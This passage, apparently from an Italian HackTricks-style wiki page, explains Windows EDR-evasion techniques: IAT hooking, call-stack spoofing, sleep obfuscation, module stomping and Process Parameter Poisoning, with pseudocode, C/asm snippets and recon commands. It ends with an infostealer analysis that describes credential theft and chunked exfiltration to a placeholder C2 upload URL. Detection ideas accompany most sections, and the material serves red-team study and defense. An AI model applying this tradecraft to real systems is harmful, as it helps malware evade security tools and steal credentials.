- Durante il caricamento della host DLL, attraversare il suo IMAGE_IMPORT_DESCRIPTOR e applicare patch alle entry IAT degli import target (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) per puntare a wrapper PIC sottili.
- Ogni wrapper PIC esegue le evasion prima di effettuare un tail-call alla vera API. Le evasion tipiche includono:
- Mask/unmask della memoria attorno alla chiamata (ad es., cifrare le regioni del beacon, RWX→RX, modificare i nomi/permessi delle pagine), quindi ripristinarli dopo la chiamata.
- Call-stack spoofing: costruire uno stack benigno ed effettuare la transizione verso la target API in modo che l’analisi del call stack risolva nei frame attesi.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un’interfaccia affinché uno script Aggressor (o equivalente) possa registrare quali API sottoporre a hooking per Beacon, BOF e DLL di post-exploitation.

Perché usare IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizza l’import sottoposto a hooking, senza modificare il codice del tool o fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le DLL di post-exploitation: eseguire hooking di LoadLibrary* permette di intercettare i caricamenti dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare la stessa masking/stack evasion alle loro chiamate API.
- Ripristina l’uso affidabile dei comandi di post-exploitation per la creazione di processi contro i rilevamenti basati sul call stack, eseguendo il wrapping di CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale acquisito prima del patching oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per il PIC ed evita di lasciare pagine writable+executable.

Call-stack spoofing stub
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (return address all'interno di moduli benigni) e poi eseguono il pivot verso la vera API.
- Questo elude le detection che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbina queste tecniche a stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Operational integration
- Anteponi il reflective loader alle DLL post-ex, in modo che il PIC e gli hook vengano inizializzati automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- Integrità IAT: entry che risolvono a indirizzi non-image (heap/anon); verifica periodica dei puntatori agli import.
- Anomalie dello stack: return address che non appartengono a immagini caricate; transizioni improvvise verso PIC non-image; ancestry di RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process sull'IAT, attività precoce del DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione dell'image-load: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Related building blocks and examples
- Reflective loaders che eseguono IAT patching durante il caricamento (ad esempio TitanLdr, AceLdr)
- Memory masking hooks (ad esempio simplehook) e PIC per lo stack-cutting (stackcutting)
- Stub PIC per il call-stack spoofing (ad esempio Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se controlli un reflective loader, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore del loader a `GetProcAddress` con un resolver personalizzato che verifica prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Costruisci un **resident PICO** (oggetto PIC persistente) che sopravviva dopo che il PIC transiente del loader si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva l'import resolver del loader (ad esempio `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import ordinali e usa una ricerca degli hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con le entry Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook rimane valido perché vive all'interno del resident PICO.

Questo produce una **redirezione IAT durante l'import** senza patchare la sezione di codice della DLL caricata dopo il caricamento.

### Forcing hookable imports when the target uses PEB-walking

Gli hook import-time vengono attivati solo se la funzione è effettivamente nell'IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza import entry), forza un import reale affinché il percorso `ProcessImports()` del loader possa rilevarlo:

- Sostituisci la risoluzione degli export tramite hash (ad esempio `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una entry IAT, consentendo l'interception quando il reflective loader risolve gli import.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Invece di patchare `Sleep`, fai hooking delle **primitive effettive di wait/IPC** utilizzate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per i wait prolungati, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` creati ad hoc.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → esegui la cifratura RC4 tramite `advapi32!SystemFunction032` sull'intera immagine mappata → esegui il blocking wait → decifra tramite RC4 → **ripristina i permessi per sezione** eseguendo il walk delle sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un template `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per i wait prolungati (ad esempio `WAIT_OBJECT_0`), così il chiamante continua mentre l'immagine è masked. Questo pattern nasconde il modulo agli scanner durante le finestre di idle ed evita la signature classica di `Sleep()` patchato.

Detection ideas (telemetry-based)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` utilizzato su buffer contigui di grandi dimensioni, della dimensione dell'immagine.
- `VirtualProtect` su intervalli estesi seguito dal ripristino personalizzato dei permessi per sezione.

### Runtime CFG registration for sleep-obfuscation gadgets

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, normalmente causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken all'interno di processi hardened:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta utilizzata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ed entry `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), il `MEMORY_RANGE_ENTRY` deve iniziare all'**image base** e coprire l'intera dimensione dell'immagine.
- Per regioni mappate manualmente/PIC/stomped, usa invece l'**allocation base** e la dimensione dell'allocazione.
- Contrassegna non solo il dispatch gadget, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, le syscall di wait/event) e tutte le sezioni eseguibili controllate dall'attaccante che diventeranno destinazioni indirette.

Questo trasforma le catene sleep in stile ROP/JOP da primitive che “funzionano solo nei processi non-CFG” in primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

La sostituzione completa di `CONTEXT` è rumorosa e può non funzionare sui sistemi con CET Shadow Stack, perché un `Rip` spoofed deve comunque corrispondere allo shadow stack hardware. Un pattern più sicuro per il sleep-masking è:<sup>[[30]](#references)</sup>

- Seleziona un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Cattura il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto spoofed, lasciando intatti `Rsp`/lo stato dello stack spoofed.
- Durante la finestra di sleep, copia l'`NT_TIB` del thread spoofed nel TEB corrente, così gli stack walker effettuano l'unwind all'interno di un intervallo di stack legittimo.
- Al termine del wait, ripristina il TIB e il contesto del thread originali.

Questo mantiene un instruction pointer coerente con CET, inducendo in errore gli stack walker EDR che si affidano ai metadati dello stack del TEB per validare gli unwind.

### APC-based alternative: Kraken Mask

Se il dispatch tramite timer queue presenta troppe signature, la stessa sequenza sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` ed eseguili con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack dell'helper, per evitare di esaurire i 64 KB predefiniti dello stack del thread.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare l'esecuzione.
- Sospendi il thread principale prima di ripristinare TIB/contesto (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la race window in cui uno scanner potrebbe intercettare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC, mantenendo gli stessi obiettivi di RC4 masking e stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation poco prima di sleep, wait o dispatch APC.
- `GetThreadContext`/`SetThreadContext` eseguiti attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o gli helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di brevi signature di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata all'interno del processo target**, invece di allocare memoria eseguibile privata evidente o caricare una nuova DLL sacrificale. Il target della sovrascrittura dovrebbe essere un'**immagine caricata e supportata dal disco**, il cui spazio di codice possa contenere il payload senza corrompere i percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Il naive stomping contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola causerebbe il crash del processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e conserva una **include list contenente solo i nomi** delle DLL già caricate.
2. Costruisci prima il payload e annota la sua **dimensione esatta in byte**.
3. Scansiona le DLL candidate sul disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file perché riflette la dimensione della sezione eseguibile **quando viene mappata in memoria**.
4. Analizza l'**Export Address Table (EAT)** e scegli un RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **blast radius**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Esempi tipici di helper per recon/selezione osservati in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferisci DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferisci export eseguiti raramente dall'applicazione target; altrimenti i normali percorsi di codice potrebbero raggiungere i byte modificati prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di cambiare l'inclusione dello shellcode da una stringa letterale a un **array di byte/inizializzatore tra parentesi graffe**, in modo che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in **pagine eseguibili supportate da immagini** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di riferimento su disco.
- Thread remoti o context pivot che iniziano l'esecuzione all'interno di un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` di una DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a memoria **scrivibile** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe successive `NAME=VALUE\0`, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi il mapping di `ShellInfo` deve essere considerato un dettaglio d'implementazione piuttosto che un contratto documentato stabile.

Questo trasforma la normale creazione di processi nella **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, risolvi il buffer copiato usando primitive di sola lettura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flusso minimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il context può essere modificato direttamente sull'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei byte nulli e shellcode staged

Tutti e tre i carrier sono **dati stringa o simili a stringhe**, quindi un payload raw contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stage privo di byte nulli** che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice è la sintesi delle costanti basata su XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Questo consente al first stage di creare stringhe per lo stack, argomenti API, percorsi DLL o un loader shellcode di second stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- eseguire il push della stringa/buffer sullo stack del target
- riservare lo **shadow space x64 di 32 byte**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertita in `PAGE_EXECUTE_READ` con `VirtualProtect`, e quindi eseguita tramite un jump, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri del processo**
- tale modifica della protezione seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e quindi di `RTL_USER_PROCESS_PARAMETERS`
- valori `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` insolitamente lunghi o ad alta entropia durante la creazione del processo

### Note

- P3 è un **trick di trasferimento cross-process**, non una primitiva di esecuzione completa di per sé: il parametro copiato necessita comunque di una modifica dei permessi per l'esecuzione e di un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato considerato dagli autori, ma scartato perché raggiunge internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft di SantaStealer per l'evasione fileless e il credential theft

SantaStealer (aka BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e credential access in un singolo workflow.<sup>[[24]](#references)</sup>

### Controllo del layout della tastiera e ritardo nel sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene rilevato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non detonare mai nelle località escluse e lasciando al contempo un artefatto utile per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` a più livelli

- La variante A percorre l'elenco dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B analizza le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali attorno alle pause per individuare il single-stepping. Qualsiasi rilevamento interrompe l'esecuzione prima dell'avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un credential helper di Chromium che viene salvato su disco oppure mappato manualmente in memoria; la modalità fileless risolve autonomamente import/relocation, impedendo la scrittura di artefatti dell'helper.
- L'helper conserva una DLL di seconda fase crittografata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica reflective il blob (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano process hollowing reflective tramite direct-syscall per effettuare l'injection in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittografare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in-memory ed esfiltrazione HTTP a blocchi

- `create_memory_based_log` itera una tabella globale di function pointer `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il conteggio dei file dopo una finestra di join di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e invia l'archivio in blocchi da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, simulando il boundary `multipart/form-data` di un browser (`----WebKitFormBoundary***`). Ogni blocco aggiunge `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l'ultimo blocco aggiunge `complete: true` per consentire al C2 di sapere che il riassemblaggio è terminato.

## Riferimenti

- [1] [Tradecraft avanzato per l'evasione: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: niente più pass gratuiti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC con call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena d'infezione e obfuscation basata su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypassing dei posture check di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con il supporto del Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompere la protective shell di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: da RAT a Builder a Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arriva in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decryption di Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: sconfiggere il malware Node.js con API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: mettere Adaptix a riposo con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sonno con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni di Red Team: guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
